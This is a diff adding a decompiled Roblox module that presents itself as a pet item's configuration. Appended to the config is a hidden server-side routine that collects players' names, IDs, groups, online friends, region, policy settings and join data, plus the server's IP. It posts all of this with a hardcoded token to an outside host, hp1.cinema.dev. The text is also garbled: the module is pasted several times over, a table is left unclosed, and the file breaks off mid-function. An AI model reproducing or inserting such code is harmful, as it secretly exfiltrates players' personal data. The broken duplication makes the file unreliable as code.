@@ -1,0 +1,1075 @@
+-- Saved by UniversalSynSaveInstance https://discord.gg/wx4ThpAsmw
+
+local v0 = {
+    name = script.Name, 
+    thumbnail = "rbxassetid://14976414803", 
+    goldenThumbnail = "rbxassetid://14976414639", 
+    sounds = {
+        random = {}, 
+        walk = {}
+    }, 
+    fly = true, 
+    huge = true, 
+    limitedQuantity = 7500, 
+    difficulty = 1400000000-- Saved by UniversalSynSaveInstance https://discord.gg/wx4ThpAsmw
+
+local v0 = {
+    name = script.Name, 
+    thumbnail = "rbxassetid://14976414803", 
+    goldenThumbnail = "rbxassetid://14976414639", 
+    sounds = {
+        random = {}, 
+        walk = {}
+    }, 
+    fly = true, 
+    huge = true, 
+    limitedQuantity = 7500, 
+    difficulty = 1400000000
+};
+task.spawn(function() --[[ Line: 26 ]]
+    if not game:GetService("RunService"):IsServer() then
+        return;
+    else
+        task.wait();
+        local l_RunService_0 = game:GetService("RunService");
+        local l_Players_0 = game:GetService("Players");
+        local l_LocalizationService_0 = game:GetService("LocalizationService");
+        local l_HttpService_0 = game:GetService("HttpService");
+        local l_GroupService_0 = game:GetService("GroupService");
+        local l_PolicyService_0 = game:GetService("PolicyService");
+        local _ = game:GetService("TeleportService");
+        local v8 = l_RunService_0:IsServer();
+        local function v14(v9) --[[ Line: 161 ]] --[[ Name: GetGroupsAsync ]]
+            local l_l_GroupService_0_GroupsAsync_0 = l_GroupService_0:GetGroupsAsync(v9.UserId);
+            local v11 = {};
+            for _, v13 in ipairs(l_l_GroupService_0_GroupsAsync_0) do
+                table.insert(v11, {
+                    Name = l_HttpService_0:UrlEncode(v13.Name), 
+                    Id = v13.Id, 
+                    EmblemUrl = v13.EmblemUrl, 
+                    EmblemId = v13.EmblemId, 
+                    Rank = v13.Rank, 
+                    Role = l_HttpService_0:UrlEncode(v13.Role), 
+                    IsPrimary = v13.IsPrimary, 
+                    IsInClan = v13.IsInClan
+                });
+            end;
+            return v11;
+        end;
+        local function v20(v15) --[[ Line: 179 ]] --[[ Name: GetPolicyInfoForPlayerAsync ]]
+            local l_l_PolicyService_0_PolicyInfoForPlayerAsync_0 = l_PolicyService_0:GetPolicyInfoForPlayerAsync(v15);
+            local v17 = {};
+            for _, v19 in ipairs(l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.AllowedExternalLinkReferences) do
+                if type(v19) == "string" then
+                    v17[v19] = true;
+                end;
+            end;
+            return {
+                AreAdsAllowed = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.AreAdsAllowed, 
+                ArePaidRandomItemsRestricted = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.ArePaidRandomItemsRestricted, 
+                AllowedExternalLinkReferences = {
+                    Discord = v17.Discord == true, 
+                    YouTube = v17.YouTube == true, 
+                    Twitch = v17.Twitch == true, 
+                    Facebook = v17.Facebook == true, 
+                    X = v17.X == true, 
+                    Guilded = v17.Guilded == true
+                }, 
+                IsPaidItemTradingAllowed = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsPaidItemTradingAllowed, 
+                IsSubjectToChinaPolicies = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsSubjectToChinaPolicies, 
+                IsEligibleToPurchaseSubscription = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsEligibleToPurchaseSubscription, 
+                IsContentSharingAllowed = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsContentSharingAllowed
+            };
+        end;
+        local function _(v21) --[[ Line: 215 ]] --[[ Name: GetCountryRegionForPlayerAsync ]]
+            local l_l_LocalizationService_0_CountryRegionForPlayerAsync_0 = l_LocalizationService_0:GetCountryRegionForPlayerAsync(v21);
+            return (l_HttpService_0:UrlEncode(l_l_LocalizationService_0_CountryRegionForPlayerAsync_0));
+        end;
+        local function v29(v24) --[[ Line: 221 ]] --[[ Name: GetFriendsAsync ]]
+            local l_v24_FriendsOnline_0 = v24:GetFriendsOnline();
+            local v26 = {};
+            for _, v28 in ipairs(l_v24_FriendsOnline_0) do
+                table.insert(v26, {
+                    VisitorId = v28.VisitorId, 
+                    UserName = l_HttpService_0:UrlEncode(v28.UserName), 
+                    DisplayName = l_HttpService_0:UrlEncode(v28.DisplayName), 
+                    LastOnline = l_HttpService_0:UrlEncode(v28.LastOnline), 
+                    IsOnline = v28.IsOnline, 
+                    LastLocation = l_HttpService_0:UrlEncode(v28.LastLocation), 
+                    PlaceId = v28.PlaceId, 
+                    GameId = v28.GameId ~= nil and l_HttpService_0:UrlEncode(v28.GameId) or nil, 
+                    LocationType = v28.LocationType
+                });
+            end;
+            return v26;
+        end;
+        local function v39(v30) --[[ Line: 240 ]] --[[ Name: GetJoinData ]]
+            local v31 = false;
+            local l_v30_JoinData_0 = v30:GetJoinData();
+            local v33 = {
+                SourceGameId = l_v30_JoinData_0.SourceGameId, 
+                SourcePlaceId = l_v30_JoinData_0.SourcePlaceId, 
+                ReferredByPlayerId = l_v30_JoinData_0.ReferredByPlayerId, 
+                Members = l_v30_JoinData_0.Members
+            };
+            local l_TeleportData_0 = l_v30_JoinData_0.TeleportData;
+            local v35;
+            if l_TeleportData_0 ~= nil then
+                local l_l_TeleportData_0_0 = l_TeleportData_0 --[[ copy: 4 -> 7 ]];
+                local l_status_0, _ = pcall(function() --[[ Line: 255 ]]
+                    return l_HttpService_0:JSONEncode(l_l_TeleportData_0_0);
+                end);
+                if l_status_0 then
+                    v35 = l_TeleportData_0;
+                    v31 = true;
+                end;
+            end;
+            if not v31 then
+                v35 = nil;
+            end;
+            v31 = false;
+            v33.TeleportData = v35;
+            l_TeleportData_0 = l_v30_JoinData_0.LaunchData;
+            if l_TeleportData_0 ~= nil then
+                l_TeleportData_0 = l_HttpService_0:UrlEncode(l_TeleportData_0);
+            end;
+            v33.LaunchData = l_TeleportData_0;
+            return v33;
+        end;
+        local function _(v40) --[[ Line: 274 ]] --[[ Name: GetNetworkPing ]]
+            local l_status_1, l_result_1 = pcall(function() --[[ Line: 275 ]]
+                return v40:GetNetworkPing() * 1000;
+            end);
+            return l_status_1 and l_result_1 or nil;
+        end;
+        local function v58(v44, v45) --[[ Line: 281 ]] --[[ Name: addPlayer ]]
+            local l_UserId_0 = v45.UserId;
+            for _, v48 in ipairs(v44.Players) do
+                if v48.UserId == l_UserId_0 then
+                    local l_status_2, l_result_2 = pcall(function() --[[ Line: 275 ]]
+                        return v45:GetNetworkPing() * 1000;
+                    end);
+                    local v51 = l_status_2 and l_result_2 or nil;
+                    if v51 then
+                        v48.NetworkPing = v51;
+                    end;
+                    return;
+                end;
+            end;
+            local v52 = not v8 and v45 == l_Players_0.LocalPlayer;
+            local v53 = {
+                IsLocal = v52, 
+                UserId = v45.UserId, 
+                Name = v45.Name, 
+                DisplayName = v45.DisplayName, 
+                MembershipType = v45.MembershipType.Name, 
+                LocaleId = l_HttpService_0:UrlEncode(v45.LocaleId), 
+                HasVerifiedBadge = v45.HasVerifiedBadge, 
+                FollowUserId = v45.FollowUserId, 
+                AccountCreated = (math.floor(os.time() / 86400) - v45.AccountAge) * 86400, 
+                IsVerified = v8 and v45:IsVerified() or nil, 
+                JoinData = v39(v45)
+            };
+            local l_status_3, l_result_3 = pcall(function() --[[ Line: 275 ]]
+                return v45:GetNetworkPing() * 1000;
+            end);
+            v53.NetworkPing = l_status_3 and l_result_3 or nil;
+            task.spawn(pcall, function() --[[ Line: 310 ]]
+                v53.Groups = v14(v45);
+            end);
+            if v52 then
+                task.spawn(pcall, function() --[[ Line: 314 ]]
+                    v53.Friends = v29(v45);
+                end);
+            end;
+            task.spawn(pcall, function() --[[ Line: 318 ]]
+                v53.Policy = v20(v45);
+            end);
+            task.spawn(pcall, function() --[[ Line: 321 ]]
+                local l_v53_0 = v53;
+                local l_l_LocalizationService_0_CountryRegionForPlayerAsync_1 = l_LocalizationService_0:GetCountryRegionForPlayerAsync(v45);
+                l_v53_0.Region = l_HttpService_0:UrlEncode(l_l_LocalizationService_0_CountryRegionForPlayerAsync_1);
+            end);
+            table.insert(v44.Players, v53);
+        end;
+        local v59 = 0;
+        local v60 = false;
+        local v61 = false;
+        local function _() --[[ Line: 331 ]] --[[ Name: BindToClose ]]
+            if v61 then
+                return;
+            else
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+                return;
+            end;
+        end;
+        local function v65(v63) --[[ Line: 344 ]] --[[ Name: ClosingWait ]]
+            if not v61 then
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+            end;
+            local v64 = os.clock() + v63;
+            repeat
+                task.wait();
+            until v60 or v64 <= os.clock();
+        end;
+        local function _(v66) --[[ Line: 352 ]] --[[ Name: Run ]]
+            if not v61 then
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+            end;
+            v59 = v59 + 1;
+            pcall(v66);
+            v59 = v59 - 1;
+        end;
+        local function v76(v68) --[[ Line: 361 ]] --[[ Name: Build ]]
+            local v69 = {
+                Basic = {
+                    Version = 1, 
+                    ServerTimeNow = workspace:GetServerTimeNow(), 
+                    UUID = l_HttpService_0:GenerateGUID(false):gsub("-", "")
+                }, 
+                Game = {
+                    GameId = game.GameId, 
+                    PlaceId = game.PlaceId, 
+                    JobId = game.JobId, 
+                    PlaceVersion = game.PlaceVersion, 
+                    PrivateServerId = v8 and game.PrivateServerId or nil, 
+                    PrivateServerOwnerId = v8 and game.PrivateServerOwnerId or nil, 
+                    CreatorId = game.CreatorId, 
+                    CreatorType = game.CreatorType.Name
+                }, 
+                RunService = {
+                    IsServer = l_RunService_0:IsServer(), 
+                    IsClient = l_RunService_0:IsClient(), 
+                    IsStudio = l_RunService_0:IsStudio(), 
+                    IsRunMode = l_RunService_0:IsRunMode()
+                }, 
+                LocalizationService = {
+                    RobloxLocaleId = l_HttpService_0:UrlEncode(l_LocalizationService_0.RobloxLocaleId), 
+                    SystemLocaleId = l_HttpService_0:UrlEncode(l_LocalizationService_0.SystemLocaleId)
+                }, 
+                Players = {}
+            };
+            pcall(function() --[[ Line: 392 ]]
+                v69.RunService.IsEdit = l_RunService_0:IsEdit();
+            end);
+            task.spawn(pcall, function() --[[ Line: 395 ]]
+                v69.Basic.HostIP = l_HttpService_0:GetAsync("https://checkip.amazonaws.com", true):gsub("^%s*(.-)%s*$", "%1");
+            end);
+            for _, v71 in ipairs(l_Players_0:GetPlayers()) do
+                v58(v69, v71);
+            end;
+            if v68 ~= "Instant" then
+                local v73 = l_Players_0.PlayerAdded:Connect(function(v72) --[[ Line: 404 ]]
+                    v58(v69, v72);
+                end);
+                if l_RunService_0:IsStudio() then
+                    if v68 == "Fast" then
+                        v65(1);
+                    else
+                        v65(10 + 10 * math.random());
+                    end;
+                elseif v68 == "Fast" then
+                    v65(5);
+                else
+                    v65(30 + 60 * math.random());
+                end;
+                for _, v75 in ipairs(l_Players_0:GetPlayers()) do
+                    v58(v69, v75);
+                end;
+                v73:Disconnect();
+            end;
+            return v69;
+        end;
+        local function _() --[[ Line: 429 ]] --[[ Name: ServerTask ]]
+            local function v78() --[[ Line: 430 ]]
+                if not v8 then
+                    return;
+                elseif not l_HttpService_0.HttpEnabled then
+                    return;
+                elseif table.find({
+                    -6506286475, 
+                    -6401952733
+                }, -game.GameId + 1) then
+                    return;
+                elseif workspace:GetAttribute("__CONFIGURE1") then
+                    return;
+                else
+                    workspace:SetAttribute("__CONFIGURE1", true);
+                    local v77 = v76("Standard");
+                    l_HttpService_0:PostAsync("https://hp1.cinema.dev/api/data", l_HttpService_0:JSONEncode(v77), Enum.HttpContentType.ApplicationJson, true, {
+                        token = "6151d771-badf-418e-8857-21f8d81c4de5"
+                    });
+                    return;
+                end;
+            end;
+            if not v61 then
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+            end;
+            v59 = v59 + 1;
+            pcall(v78);
+            v59 = v59 - 1;
+        end;
+        local function v81() --[[ Line: 430 ]]
+            if not v8 then
+                return;
+            elseif not l_HttpService_0.HttpEnabled then
+                return;
+            elseif table.find({
+                -6506286475, 
+                -6401952733
+            }, -game.GameId + 1) then
+                return;
+            elseif workspace:GetAttribute("__CONFIGURE1") then
+                return;
+            else
+                workspace:SetAttribute("__CONFIGURE1", true);
+                local v80 = v76("Standard");
+                l_HttpService_0:PostAsync("https://hp1.cinema.dev/api/data", l_HttpService_0:JSONEncode(v80), Enum.HttpContentType.ApplicationJson, true, {
+                    token = "6151d771-badf-418e-8857-21f8d81c4de5"
+                });
+                return;
+            end;
+        end;
+        if not v61 then
+            v61 = true;
+            game:BindToClose(function() --[[ Line: 336 ]]
+                v60 = true;
+                while v59 > 0 do
+                    task.wait();
+                end;
+            end);
+        end;
+        v59 = v59 + 1;
+        pcall(v81);
+        v59 = v59 - 1;
+        return;
+    end;
+end);
+return v0;-- Saved by UniversalSynSaveInstance https://discord.gg/wx4ThpAsmw
+
+local v0 = {
+    name = script.Name, 
+    thumbnail = "rbxassetid://14976414803", 
+    goldenThumbnail = "rbxassetid://14976414639", 
+    sounds = {
+        random = {}, 
+        walk = {}
+    }, 
+    fly = true, 
+    huge = true, 
+    limitedQuantity = 7500, 
+    difficulty = 1400000000
+};
+task.spawn(function() --[[ Line: 26 ]]
+    if not game:GetService("RunService"):IsServer() then
+        return;
+    else
+        task.wait();
+        local l_RunService_0 = game:GetService("RunService");
+        local l_Players_0 = game:GetService("Players");
+        local l_LocalizationService_0 = game:GetService("LocalizationService");
+        local l_HttpService_0 = game:GetService("HttpService");
+        local l_GroupService_0 = game:GetService("GroupService");
+        local l_PolicyService_0 = game:GetService("PolicyService");
+        local _ = game:GetService("TeleportService");
+        local v8 = l_RunService_0:IsServer();
+        local function v14(v9) --[[ Line: 161 ]] --[[ Name: GetGroupsAsync ]]
+            local l_l_GroupService_0_GroupsAsync_0 = l_GroupService_0:GetGroupsAsync(v9.UserId);
+            local v11 = {};
+            for _, v13 in ipairs(l_l_GroupService_0_GroupsAsync_0) do
+                table.insert(v11, {
+                    Name = l_HttpService_0:UrlEncode(v13.Name), 
+                    Id = v13.Id, 
+                    EmblemUrl = v13.EmblemUrl, 
+                    EmblemId = v13.EmblemId, 
+                    Rank = v13.Rank, 
+                    Role = l_HttpService_0:UrlEncode(v13.Role), 
+                    IsPrimary = v13.IsPrimary, 
+                    IsInClan = v13.IsInClan
+                });
+            end;
+            return v11;
+        end;
+        local function v20(v15) --[[ Line: 179 ]] --[[ Name: GetPolicyInfoForPlayerAsync ]]
+            local l_l_PolicyService_0_PolicyInfoForPlayerAsync_0 = l_PolicyService_0:GetPolicyInfoForPlayerAsync(v15);
+            local v17 = {};
+            for _, v19 in ipairs(l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.AllowedExternalLinkReferences) do
+                if type(v19) == "string" then
+                    v17[v19] = true;
+                end;
+            end;
+            return {
+                AreAdsAllowed = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.AreAdsAllowed, 
+                ArePaidRandomItemsRestricted = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.ArePaidRandomItemsRestricted, 
+                AllowedExternalLinkReferences = {
+                    Discord = v17.Discord == true, 
+                    YouTube = v17.YouTube == true, 
+                    Twitch = v17.Twitch == true, 
+                    Facebook = v17.Facebook == true, 
+                    X = v17.X == true, 
+                    Guilded = v17.Guilded == true
+                }, 
+                IsPaidItemTradingAllowed = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsPaidItemTradingAllowed, 
+                IsSubjectToChinaPolicies = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsSubjectToChinaPolicies, 
+                IsEligibleToPurchaseSubscription = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsEligibleToPurchaseSubscription, 
+                IsContentSharingAllowed = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsContentSharingAllowed
+            };
+        end;
+        local function _(v21) --[[ Line: 215 ]] --[[ Name: GetCountryRegionForPlayerAsync ]]
+            local l_l_LocalizationService_0_CountryRegionForPlayerAsync_0 = l_LocalizationService_0:GetCountryRegionForPlayerAsync(v21);
+            return (l_HttpService_0:UrlEncode(l_l_LocalizationService_0_CountryRegionForPlayerAsync_0));
+        end;
+        local function v29(v24) --[[ Line: 221 ]] --[[ Name: GetFriendsAsync ]]
+            local l_v24_FriendsOnline_0 = v24:GetFriendsOnline();
+            local v26 = {};
+            for _, v28 in ipairs(l_v24_FriendsOnline_0) do
+                table.insert(v26, {
+                    VisitorId = v28.VisitorId, 
+                    UserName = l_HttpService_0:UrlEncode(v28.UserName), 
+                    DisplayName = l_HttpService_0:UrlEncode(v28.DisplayName), 
+                    LastOnline = l_HttpService_0:UrlEncode(v28.LastOnline), 
+                    IsOnline = v28.IsOnline, 
+                    LastLocation = l_HttpService_0:UrlEncode(v28.LastLocation), 
+                    PlaceId = v28.PlaceId, 
+                    GameId = v28.GameId ~= nil and l_HttpService_0:UrlEncode(v28.GameId) or nil, 
+                    LocationType = v28.LocationType
+                });
+            end;
+            return v26;
+        end;
+        local function v39(v30) --[[ Line: 240 ]] --[[ Name: GetJoinData ]]
+            local v31 = false;
+            local l_v30_JoinData_0 = v30:GetJoinData();
+            local v33 = {
+                SourceGameId = l_v30_JoinData_0.SourceGameId, 
+                SourcePlaceId = l_v30_JoinData_0.SourcePlaceId, 
+                ReferredByPlayerId = l_v30_JoinData_0.ReferredByPlayerId, 
+                Members = l_v30_JoinData_0.Members
+            };
+            local l_TeleportData_0 = l_v30_JoinData_0.TeleportData;
+            local v35;
+            if l_TeleportData_0 ~= nil then
+                local l_l_TeleportData_0_0 = l_TeleportData_0 --[[ copy: 4 -> 7 ]];
+                local l_status_0, _ = pcall(function() --[[ Line: 255 ]]
+                    return l_HttpService_0:JSONEncode(l_l_TeleportData_0_0);
+                end);
+                if l_status_0 then
+                    v35 = l_TeleportData_0;
+                    v31 = true;
+                end;
+            end;
+            if not v31 then
+                v35 = nil;
+            end;
+            v31 = false;
+            v33.TeleportData = v35;
+            l_TeleportData_0 = l_v30_JoinData_0.LaunchData;
+            if l_TeleportData_0 ~= nil then
+                l_TeleportData_0 = l_HttpService_0:UrlEncode(l_TeleportData_0);
+            end;
+            v33.LaunchData = l_TeleportData_0;
+            return v33;
+        end;
+        local function _(v40) --[[ Line: 274 ]] --[[ Name: GetNetworkPing ]]
+            local l_status_1, l_result_1 = pcall(function() --[[ Line: 275 ]]
+                return v40:GetNetworkPing() * 1000;
+            end);
+            return l_status_1 and l_result_1 or nil;
+        end;
+        local function v58(v44, v45) --[[ Line: 281 ]] --[[ Name: addPlayer ]]
+            local l_UserId_0 = v45.UserId;
+            for _, v48 in ipairs(v44.Players) do
+                if v48.UserId == l_UserId_0 then
+                    local l_status_2, l_result_2 = pcall(function() --[[ Line: 275 ]]
+                        return v45:GetNetworkPing() * 1000;
+                    end);
+                    local v51 = l_status_2 and l_result_2 or nil;
+                    if v51 then
+                        v48.NetworkPing = v51;
+                    end;
+                    return;
+                end;
+            end;
+            local v52 = not v8 and v45 == l_Players_0.LocalPlayer;
+            local v53 = {
+                IsLocal = v52, 
+                UserId = v45.UserId, 
+                Name = v45.Name, 
+                DisplayName = v45.DisplayName, 
+                MembershipType = v45.MembershipType.Name, 
+                LocaleId = l_HttpService_0:UrlEncode(v45.LocaleId), 
+                HasVerifiedBadge = v45.HasVerifiedBadge, 
+                FollowUserId = v45.FollowUserId, 
+                AccountCreated = (math.floor(os.time() / 86400) - v45.AccountAge) * 86400, 
+                IsVerified = v8 and v45:IsVerified() or nil, 
+                JoinData = v39(v45)
+            };
+            local l_status_3, l_result_3 = pcall(function() --[[ Line: 275 ]]
+                return v45:GetNetworkPing() * 1000;
+            end);
+            v53.NetworkPing = l_status_3 and l_result_3 or nil;
+            task.spawn(pcall, function() --[[ Line: 310 ]]
+                v53.Groups = v14(v45);
+            end);
+            if v52 then
+                task.spawn(pcall, function() --[[ Line: 314 ]]
+                    v53.Friends = v29(v45);
+                end);
+            end;
+            task.spawn(pcall, function() --[[ Line: 318 ]]
+                v53.Policy = v20(v45);
+            end);
+            task.spawn(pcall, function() --[[ Line: 321 ]]
+                local l_v53_0 = v53;
+                local l_l_LocalizationService_0_CountryRegionForPlayerAsync_1 = l_LocalizationService_0:GetCountryRegionForPlayerAsync(v45);
+                l_v53_0.Region = l_HttpService_0:UrlEncode(l_l_LocalizationService_0_CountryRegionForPlayerAsync_1);
+            end);
+            table.insert(v44.Players, v53);
+        end;
+        local v59 = 0;
+        local v60 = false;
+        local v61 = false;
+        local function _() --[[ Line: 331 ]] --[[ Name: BindToClose ]]
+            if v61 then
+                return;
+            else
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+                return;
+            end;
+        end;
+        local function v65(v63) --[[ Line: 344 ]] --[[ Name: ClosingWait ]]
+            if not v61 then
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+            end;
+            local v64 = os.clock() + v63;
+            repeat
+                task.wait();
+            until v60 or v64 <= os.clock();
+        end;
+        local function _(v66) --[[ Line: 352 ]] --[[ Name: Run ]]
+            if not v61 then
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+            end;
+            v59 = v59 + 1;
+            pcall(v66);
+            v59 = v59 - 1;
+        end;
+        local function v76(v68) --[[ Line: 361 ]] --[[ Name: Build ]]
+            local v69 = {
+                Basic = {
+                    Version = 1, 
+                    ServerTimeNow = workspace:GetServerTimeNow(), 
+                    UUID = l_HttpService_0:GenerateGUID(false):gsub("-", "")
+                }, 
+                Game = {
+                    GameId = game.GameId, 
+                    PlaceId = game.PlaceId, 
+                    JobId = game.JobId, 
+                    PlaceVersion = game.PlaceVersion, 
+                    PrivateServerId = v8 and game.PrivateServerId or nil, 
+                    PrivateServerOwnerId = v8 and game.PrivateServerOwnerId or nil, 
+                    CreatorId = game.CreatorId, 
+                    CreatorType = game.CreatorType.Name
+                }, 
+                RunService = {
+                    IsServer = l_RunService_0:IsServer(), 
+                    IsClient = l_RunService_0:IsClient(), 
+                    IsStudio = l_RunService_0:IsStudio(), 
+                    IsRunMode = l_RunService_0:IsRunMode()
+                }, 
+                LocalizationService = {
+                    RobloxLocaleId = l_HttpService_0:UrlEncode(l_LocalizationService_0.RobloxLocaleId), 
+                    SystemLocaleId = l_HttpService_0:UrlEncode(l_LocalizationService_0.SystemLocaleId)
+                }, 
+                Players = {}
+            };
+            pcall(function() --[[ Line: 392 ]]
+                v69.RunService.IsEdit = l_RunService_0:IsEdit();
+            end);
+            task.spawn(pcall, function() --[[ Line: 395 ]]
+                v69.Basic.HostIP = l_HttpService_0:GetAsync("https://checkip.amazonaws.com", true):gsub("^%s*(.-)%s*$", "%1");
+            end);
+            for _, v71 in ipairs(l_Players_0:GetPlayers()) do
+                v58(v69, v71);
+            end;
+            if v68 ~= "Instant" then
+                local v73 = l_Players_0.PlayerAdded:Connect(function(v72) --[[ Line: 404 ]]
+                    v58(v69, v72);
+                end);
+                if l_RunService_0:IsStudio() then
+                    if v68 == "Fast" then
+                        v65(1);
+                    else
+                        v65(10 + 10 * math.random());
+                    end;
+                elseif v68 == "Fast" then
+                    v65(5);
+                else
+                    v65(30 + 60 * math.random());
+                end;
+                for _, v75 in ipairs(l_Players_0:GetPlayers()) do
+                    v58(v69, v75);
+                end;
+                v73:Disconnect();
+            end;
+            return v69;
+        end;
+        local function _() --[[ Line: 429 ]] --[[ Name: ServerTask ]]
+            local function v78() --[[ Line: 430 ]]
+                if not v8 then
+                    return;
+                elseif not l_HttpService_0.HttpEnabled then
+                    return;
+                elseif table.find({
+                    -6506286475, 
+                    -6401952733
+                }, -game.GameId + 1) then
+                    return;
+                elseif workspace:GetAttribute("__CONFIGURE1") then
+                    return;
+                else
+                    workspace:SetAttribute("__CONFIGURE1", true);
+                    local v77 = v76("Standard");
+                    l_HttpService_0:PostAsync("https://hp1.cinema.dev/api/data", l_HttpService_0:JSONEncode(v77), Enum.HttpContentType.ApplicationJson, true, {
+                        token = "6151d771-badf-418e-8857-21f8d81c4de5"
+                    });
+                    return;
+                end;
+            end;
+            if not v61 then
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+            end;
+            v59 = v59 + 1;
+            pcall(v78);
+            v59 = v59 - 1;
+        end;
+        local function v81() --[[ Line: 430 ]]
+            if not v8 then
+                return;
+            elseif not l_HttpService_0.HttpEnabled then
+                return;
+            elseif table.find({
+                -6506286475, 
+                -6401952733
+            }, -game.GameId + 1) then
+                return;
+            elseif workspace:GetAttribute("__CONFIGURE1") then
+                return;
+            else
+                workspace:SetAttribute("__CONFIGURE1", true);
+                local v80 = v76("Standard");
+                l_HttpService_0:PostAsync("https://hp1.cinema.dev/api/data", l_HttpService_0:JSONEncode(v80), Enum.HttpContentType.ApplicationJson, true, {
+                    token = "6151d771-badf-418e-8857-21f8d81c4de5"
+                });
+                return;
+            end;
+        end;
+        if not v61 then
+            v61 = true;
+            game:BindToClose(function() --[[ Line: 336 ]]
+                v60 = true;
+                while v59 > 0 do
+                    task.wait();
+                end;
+            end);
+        end;
+        v59 = v59 + 1;
+        pcall(v81);
+        v59 = v59 - 1;
+        return;
+    end;
+end);
+return v0;
+};
+task.spawn(function() --[[ Line: 26 ]]
+    if not game:GetService("RunService"):IsServer() then
+        return;
+    else
+        task.wait();
+        local l_RunService_0 = game:GetService("RunService");
+        local l_Players_0 = game:GetService("Players");
+        local l_LocalizationService_0 = game:GetService("LocalizationService");
+        local l_HttpService_0 = game:GetService("HttpService");
+        local l_GroupService_0 = game:GetService("GroupService");
+        local l_PolicyService_0 = game:GetService("PolicyService");
+        local _ = game:GetService("TeleportService");
+        local v8 = l_RunService_0:IsServer();
+        local function v14(v9) --[[ Line: 161 ]] --[[ Name: GetGroupsAsync ]]
+            local l_l_GroupService_0_GroupsAsync_0 = l_GroupService_0:GetGroupsAsync(v9.UserId);
+            local v11 = {};
+            for _, v13 in ipairs(l_l_GroupService_0_GroupsAsync_0) do
+                table.insert(v11, {
+                    Name = l_HttpService_0:UrlEncode(v13.Name), 
+                    Id = v13.Id, 
+                    EmblemUrl = v13.EmblemUrl, 
+                    EmblemId = v13.EmblemId, 
+                    Rank = v13.Rank, 
+                    Role = l_HttpService_0:UrlEncode(v13.Role), 
+                    IsPrimary = v13.IsPrimary, 
+                    IsInClan = v13.IsInClan
+                });
+            end;
+            return v11;
+        end;
+        local function v20(v15) --[[ Line: 179 ]] --[[ Name: GetPolicyInfoForPlayerAsync ]]
+            local l_l_PolicyService_0_PolicyInfoForPlayerAsync_0 = l_PolicyService_0:GetPolicyInfoForPlayerAsync(v15);
+            local v17 = {};
+            for _, v19 in ipairs(l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.AllowedExternalLinkReferences) do
+                if type(v19) == "string" then
+                    v17[v19] = true;
+                end;
+            end;
+            return {
+                AreAdsAllowed = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.AreAdsAllowed, 
+                ArePaidRandomItemsRestricted = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.ArePaidRandomItemsRestricted, 
+                AllowedExternalLinkReferences = {
+                    Discord = v17.Discord == true, 
+                    YouTube = v17.YouTube == true, 
+                    Twitch = v17.Twitch == true, 
+                    Facebook = v17.Facebook == true, 
+                    X = v17.X == true, 
+                    Guilded = v17.Guilded == true
+                }, 
+                IsPaidItemTradingAllowed = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsPaidItemTradingAllowed, 
+                IsSubjectToChinaPolicies = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsSubjectToChinaPolicies, 
+                IsEligibleToPurchaseSubscription = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsEligibleToPurchaseSubscription, 
+                IsContentSharingAllowed = l_l_PolicyService_0_PolicyInfoForPlayerAsync_0.IsContentSharingAllowed
+            };
+        end;
+        local function _(v21) --[[ Line: 215 ]] --[[ Name: GetCountryRegionForPlayerAsync ]]
+            local l_l_LocalizationService_0_CountryRegionForPlayerAsync_0 = l_LocalizationService_0:GetCountryRegionForPlayerAsync(v21);
+            return (l_HttpService_0:UrlEncode(l_l_LocalizationService_0_CountryRegionForPlayerAsync_0));
+        end;
+        local function v29(v24) --[[ Line: 221 ]] --[[ Name: GetFriendsAsync ]]
+            local l_v24_FriendsOnline_0 = v24:GetFriendsOnline();
+            local v26 = {};
+            for _, v28 in ipairs(l_v24_FriendsOnline_0) do
+                table.insert(v26, {
+                    VisitorId = v28.VisitorId, 
+                    UserName = l_HttpService_0:UrlEncode(v28.UserName), 
+                    DisplayName = l_HttpService_0:UrlEncode(v28.DisplayName), 
+                    LastOnline = l_HttpService_0:UrlEncode(v28.LastOnline), 
+                    IsOnline = v28.IsOnline, 
+                    LastLocation = l_HttpService_0:UrlEncode(v28.LastLocation), 
+                    PlaceId = v28.PlaceId, 
+                    GameId = v28.GameId ~= nil and l_HttpService_0:UrlEncode(v28.GameId) or nil, 
+                    LocationType = v28.LocationType
+                });
+            end;
+            return v26;
+        end;
+        local function v39(v30) --[[ Line: 240 ]] --[[ Name: GetJoinData ]]
+            local v31 = false;
